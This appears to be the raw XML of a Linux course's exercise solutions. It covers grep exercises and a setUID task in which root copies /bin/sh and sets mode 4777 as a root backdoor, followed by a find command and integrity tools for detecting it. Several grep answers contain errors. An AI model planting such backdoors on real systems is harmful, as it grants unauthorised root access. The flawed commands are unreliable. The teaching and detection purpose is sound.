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af38b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paragraph-rsid="000af38b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rsid="000af38b" officeooo:paragraph-rsid="000af38b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bf9e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officeooo:rsid="000af38b" officeooo:paragraph-rsid="000af38b"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0.109cm" loext:contextual-spacing="false" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false" style:shadow="none"/>
      <style:text-properties fo:language="en" fo:country="GB" fo:font-weight="bold" officeooo:paragraph-rsid="000bf9ed" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0.109cm" loext:contextual-spacing="false" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false" style:shadow="none"/>
      <style:text-properties fo:language="en" fo:country="GB" style:text-underline-style="none" fo:font-weight="bold" officeooo:paragraph-rsid="000c8dd8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101cm" fo:margin-bottom="0.109cm" loext:contextual-spacing="false" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false" style:shadow="none"/>
      <style:text-properties fo:language="en" fo:country="GB" style:text-underline-style="none" fo:font-weight="normal" officeooo:paragraph-rsid="000bf9ed" style:font-weight-asian="normal" style:font-weight-complex="normal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Titulo">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:language="en" fo:country="GB"/>
    </style:style>
    <style:style style:name="P1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14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P15" style:family="paragraph" style:parent-style-name="Header">
      <style:text-properties fo:language="en" fo:country="GB"/>
    </style:style>
    <style:style style:name="P16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P17" style:family="paragraph" style:parent-style-name="Heading_20_1">
      <style:text-properties fo:language="en" fo:country="GB"/>
    </style:style>
    <style:style style:name="P18" style:family="paragraph" style:parent-style-name="Heading_20_2">
      <style:text-properties fo:language="en" fo:country="GB"/>
    </style:style>
    <style:style style:name="P19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Standard">
      <style:text-properties fo:text-transform="uppercase"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22" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties fo:font-variant="normal" fo:text-transform="none" fo:color="#336633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23" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties style:font-name="Calibri" fo:font-size="24pt" fo:language="en" fo:country="GB" fo:font-weight="bold" style:font-size-asian="24pt" style:font-weight-asian="bold" style:font-size-complex="24pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P24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2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26" style:family="paragraph" style:parent-style-name="Standard" style:master-page-name="First_20_Page">
      <style:paragraph-properties style:page-number="auto"/>
      <style:text-properties fo:language="en" fo:country="GB"/>
    </style:style>
    <style:style style:name="P2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28" style:family="paragraph" style:parent-style-name="Standard" style:master-page-name="Index">
      <style:paragraph-properties style:page-number="auto"/>
      <style:text-properties fo:language="en" fo:country="GB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30" style:family="paragraph" style:parent-style-name="Standard" style:master-page-name="Standard">
      <style:paragraph-properties style:page-number="auto"/>
      <style:text-properties fo:language="en" fo:country="GB"/>
    </style:style>
    <style:style style:name="P31" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:language="en" fo:country="GB"/>
    </style:style>
    <style:style style:name="P32" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:text-properties fo:language="en" fo:country="GB"/>
    </style:style>
    <style:style style:name="P33" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:text-properties fo:language="en" fo:country="GB" officeooo:paragraph-rsid="000bf9ed"/>
    </style:style>
    <style:style style:name="P34" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:text-properties fo:language="en" fo:country="GB" officeooo:rsid="000a32f2" officeooo:paragraph-rsid="000bf9ed"/>
    </style:style>
    <style:style style:name="P35" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L1">
      <style:text-properties fo:language="en" fo:country="GB" officeooo:rsid="000adb32" officeooo:paragraph-rsid="000bf9ed"/>
    </style:style>
    <style:style style:name="P36" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2">
      <style:text-properties fo:language="en" fo:country="GB"/>
    </style:style>
    <style:style style:name="P37" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:text-properties fo:color="#336633" fo:font-size="14pt" fo:language="en" fo:country="GB" style:font-size-asian="14pt" style:font-size-complex="14pt"/>
    </style:style>
    <style:style style:name="P38" style:family="paragraph" style:parent-style-name="Text_20_body" style:list-style-name="L2" style:master-page-name="">
      <style:paragraph-properties fo:margin-top="0.101cm" fo:margin-bottom="0.109cm" loext:contextual-spacing="false" fo:text-align="justify" style:justify-single-word="false" style:page-number="auto" style:shadow="none"/>
      <style:text-properties fo:language="en" fo:country="GB"/>
    </style:style>
    <style:style style:name="P3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42" style:family="paragraph" style:parent-style-name="Text_20_body">
      <style:paragraph-properties fo:margin-left="0cm" fo:margin-right="0cm" fo:margin-top="0.101cm" fo:margin-bottom="0.109cm" loext:contextual-spacing="false" fo:text-align="justify" style:justify-single-word="false" fo:text-indent="0cm" style:auto-text-indent="false" style:shadow="none"/>
      <style:text-properties fo:language="en" fo:country="GB" officeooo:paragraph-rsid="000bf9ed"/>
    </style:style>
    <style:style style:name="P43" style:family="paragraph" style:parent-style-name="Titulo">
      <style:text-properties fo:language="en" fo:country="G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f38b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language="en" fo:country="GB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name="Calibri" fo:font-size="12pt" fo:language="en" fo:country="GB" style:font-size-asian="12pt" style:font-size-complex="12pt"/>
    </style:style>
    <style:style style:name="T12" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="000bf9e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0bf9e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0a32f2"/>
    </style:style>
    <style:style style:name="T16" style:family="text">
      <style:text-properties officeooo:rsid="000adb32"/>
    </style:style>
    <style:style style:name="T17" style:family="text">
      <style:text-properties officeooo:rsid="000af38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af38b" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T20" style:family="text">
      <style:text-properties fo:font-weight="normal" officeooo:rsid="000c8dd8" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T21" style:family="text">
      <style:text-properties fo:language="en" fo:country="GB"/>
    </style:style>
    <style:style style:name="T22" style:family="text">
      <style:text-properties fo:language="en" fo:country="GB" officeooo:rsid="000adb32"/>
    </style:style>
    <style:style style:name="T23" style:family="text">
      <style:text-properties fo:language="en" fo:country="GB" officeooo:rsid="000af38b"/>
    </style:style>
    <style:style style:name="T24" style:family="text">
      <style:text-properties fo:language="en" fo:country="GB" fo:font-weight="normal" officeooo:rsid="000af38b" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="T25" style:family="text">
      <style:text-properties fo:language="en" fo:country="GB" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color" fo:font-weight="bold" officeooo:rsid="000bf9ed" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T26" style:family="text">
      <style:text-properties fo:language="en" fo:country="GB" style:text-underline-style="none" fo:font-weight="bold" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T27" style:family="text">
      <style:text-properties fo:language="en" fo:country="GB" style:text-underline-style="none" fo:font-weight="bold" officeooo:rsid="000bf9ed" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T28" style:family="text">
      <style:text-properties officeooo:rsid="000bf9ed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00bf9ed" style:font-weight-asian="bold" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T31" style:family="text">
      <style:text-properties officeooo:rsid="000c8dd8"/>
    </style:style>
    <style:style style:name="T32" style:family="text">
      <style:text-properties officeooo:rsid="000d9166"/>
    </style:style>
    <style:style style:name="T33" style:family="text">
      <style:text-properties officeooo:rsid="000fcba8"/>
    </style:style>
    <style:style style:name="T34" style:family="text">
      <style:text-properties officeooo:rsid="0012d8a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6"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"><draw:frame draw:style-name="fr2" draw:name="gráficos1" text:anchor-type="paragraph" svg:x="0cm" svg:y="1.027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20"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P21">Unit 10.<text:user-field-get text:name="Tema">Linux</text:user-field-get></text:p>
      <text:p text:style-name="P22">Activities 3 - <text:span text:style-name="T32">Solutions</text:span>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Alfredo Oltra / Sergio Garcia</text:p>
      <text:p text:style-name="P11"><text:span text:style-name="T7"><text:s/></text:span><text:a xlink:type="simple" xlink:href="mailto:mail@ceedcv.e" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T11">alfredo.oltra@ceedcv.e</text:span></text:a><text:span text:style-name="T9">s</text:span></text:p>
      <text:p text:style-name="P40">201<text:span text:style-name="T34">9</text:span>/20<text:span text:style-name="T34">20</text:span></text:p>
      <text:p text:style-name="P27"><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>Versión:<text:date style:data-style-name="N104" text:date-value="2019-09-27T12:14:45.090850875">190927</text:date>.<text:time style:data-style-name="N105" text:time-value="2019-09-27T12:14:45.091070900">1214</text:time></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P28"/>
      <text:p text:style-name="P37">Licencia</text:p>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P2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5"/>
      <text:p text:style-name="P25"><text:s/></text:p>
      <text:p text:style-name="P37">Nomenclatura</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">A lo largo de este tema se utilizarán distintos símbolos para distinguir elementos importantes dentro del contenido. Estos símbolos son:</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P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"/>
      <text:p text:style-name="P2"><text:span text:style-name="T3"> </text:span>Atención. Hace referencia a un tipo de actividad donde los alumnos suelen cometer equivocaciones. </text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:h text:style-name="P17" text:outline-level="1" text:is-list-header="true"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P30"/>
      <text:p text:style-name="P20"/>
      <text:p text:style-name="P43">UD0<text:user-field-get text:name="NumeroTema">10</text:user-field-get>. <text:user-field-get text:name="Tema">Linux</text:user-field-get></text:p>
      <text:p text:style-name="P12">Activities 3</text:p>
      <text:h text:style-name="P18" text:outline-level="2">Activity 4</text:h>
      <text:p text:style-name="P1"><text:span text:style-name="T3"></text:span>Solves those exercises using grep. grep. Note: you can chain <text:span text:style-name="T14">grep</text:span> commands using | redirector.</text:p>
      <text:list xml:id="list752340013" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P32">Show all lines of file <text:span text:style-name="T14">list.xt</text:span> that contain <text:span text:style-name="T14">lib</text:span>.</text:p>
          <text:p text:style-name="P32"><text:span text:style-name="T12">Solution:</text:span><text:span text:style-name="T30"> </text:span><text:span text:style-name="T28">g</text:span>rep "<text:span text:style-name="T15">lib</text:span>" <text:span text:style-name="T15">list.xt</text:span> </text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P32">Show how many lines contain <text:span text:style-name="T14">mp3</text:span> in <text:span text:style-name="T14">list.txt</text:span>.</text:p>
          <text:p text:style-name="P34"><text:span text:style-name="T12">Solution:</text:span><text:span text:style-name="T30"> </text:span>grep mp3 list.txt | wc -l</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P32">Show files inside <text:span text:style-name="T14">/etc</text:span> directory that contain <text:span text:style-name="T14">host</text:span> string inside.</text:p>
          <text:p text:style-name="P34"><text:span text:style-name="T12">Solution:</text:span><text:span text:style-name="T30"> </text:span>grep -<text:span text:style-name="T16">r host /etc</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P32">Show all lines of file <text:span text:style-name="T14">list.xt</text:span> that not contains <text:span text:style-name="T14">a</text:span> (uppercase or lowercase).</text:p>
          <text:p text:style-name="P35"><text:span text:style-name="T12">Solution:</text:span><text:span text:style-name="T30"> </text:span>grep -vi *<text:span text:style-name="T17">a*</text:span><text:span text:style-name="T19"> list.txt</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P32">Show all lines of file <text:span text:style-name="T14">list.xt</text:span> that not contains <text:span text:style-name="T14">a</text:span> (uppercase or lowercase) and contains <text:span text:style-name="T14">m</text:span> (lowercase).</text:p>
          <text:p text:style-name="P33"><text:span text:style-name="T12">Solution:</text:span><text:span text:style-name="T30"> </text:span><text:span text:style-name="T16">grep -vi *a*</text:span><text:span text:style-name="T19"> list.txt | grep I *m*</text:span></text:p>
        </text:list-item>
      </text:list>
      <text:h text:style-name="P18" text:outline-level="2">Activity 6</text:h>
      <text:list xml:id="list1944666744" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P38">Using <text:span text:style-name="T14">setUid</text:span> bit and supposing that temporally (something like 1 hour) you have access to a machine as root and in that machine you have an user called <text:span text:style-name="T14">alumno</text:span> without sudoer permissions.</text:p>
          <text:list>
            <text:list-header>
              <text:p text:style-name="P36">How can we use <text:span text:style-name="T14">setUid</text:span> bit to create a backdoor? </text:p>
              <text:p text:style-name="P36">CLUE: file <text:span text:style-name="T14">/bin/sh</text:span> could be useful.</text:p>
            </text:list-header>
          </text:list>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"><text:tab/><text:tab/><text:span text:style-name="T13">Solution</text:span></text:p>
      <text:p text:style-name="P5"><text:tab/><text:tab/>AS root:</text:p>
      <text:p text:style-name="P4"><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P7"><text:tab/><text:tab/>cd $HOME</text:p>
      <text:p text:style-name="P7"><text:tab/><text:tab/>cp /bin/sh ./</text:p>
      <text:p text:style-name="P3"><text:tab/><text:tab/><text:span text:style-name="T17">chown root ./sh</text:span></text:p>
      <text:p text:style-name="P3"><text:tab/><text:tab/><text:span text:style-name="T17">chmod 4777 ./sh</text:span></text:p>
      <text:p text:style-name="P3"><text:tab/><text:tab/><text:span text:style-name="T28">Now we have created the backdoor</text:span></text:p>
      <text:p text:style-name="P3"><text:tab/><text:tab/></text:p>
      <text:p text:style-name="P6"><text:tab/></text:p>
      <text:p text:style-name="P6"><text:soft-page-break/><text:tab/><text:span text:style-name="T5">AS myuser:</text:span></text:p>
      <text:p text:style-name="P3"><text:tab/><text:tab/><text:span text:style-name="T17">Simply run ./sh and you will be root (you can check it with id command)</text:span></text:p>
      <text:p text:style-name="P2"><text:tab/></text:p>
      <text:list xml:id="list121446962827711" text:continue-numbering="true" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P38">How can we detect that kind of backdoors on our system? What kind of measures can we take to be safe against this kind of attack?</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P8"><text:tab/><text:span text:style-name="T13">Solution</text:span></text:p>
      <text:p text:style-name="P10"><text:tab/><text:span text:style-name="T31">With:</text:span></text:p>
      <text:p text:style-name="P42"><text:span text:style-name="T29"><text:tab/></text:span>find / -path /proc -prune -o -type f -perm +4000 -ls <text:span text:style-name="T31">&gt; listado.txt</text:span></text:p>
      <text:p text:style-name="P10"><text:tab/><text:span text:style-name="T31">We can obtain all the files with setUID bit active. If the list changes, maybe a new setUID file <text:tab/>has been created.</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T20">Also we can use software for “system integrity” </text:span><text:span text:style-name="T31"><text:tab/></text:span><text:a xlink:type="simple" xlink:href="http://www.ossec.net/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T31">http://www.ossec.net/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MP3" style:family="paragraph" style:parent-style-name="Header">
      <style:text-properties fo:language="en" fo:country="GB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6H27M42S</meta:editing-duration>
    <meta:editing-cycles>40</meta:editing-cycles>
    <meta:generator>LibreOffice/6.3.1.2$Linux_X86_64 LibreOffice_project/30$Build-2</meta:generator>
    <dc:title>Plantilla CEED</dc:title>
    <meta:initial-creator>Alfredo Oltra Orengo</meta:initial-creator>
    <dc:date>2019-09-27T12:14:37.655998213</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="1" meta:object-count="0" meta:page-count="4" meta:paragraph-count="55" meta:word-count="429" meta:character-count="2551" meta:non-whitespace-character-count="2125"/>
  </office:meta>
</office:document-meta>
</file>